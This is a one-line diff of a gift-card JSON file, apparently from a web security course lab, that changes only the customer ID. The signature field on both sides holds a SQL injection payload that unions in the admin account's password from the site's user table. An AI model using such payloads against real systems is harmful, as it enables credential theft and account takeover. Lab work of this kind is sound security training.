@@ -1,1 +1,1 @@
-{"merchant_id": "NYU Apparel Card", "customer_id": "testuser", "total_value": 95, "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "377a338452f43e2b9d4cb9145dbc6c77 union select password from LegacySite_user where LegacySite_user.username='admin'--"}]}
+{"merchant_id": "NYU Apparel Card", "customer_id": "test", "total_value": 95, "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "377a338452f43e2b9d4cb9145dbc6c77 union select password from LegacySite_user where LegacySite_user.username='admin'--"}]}
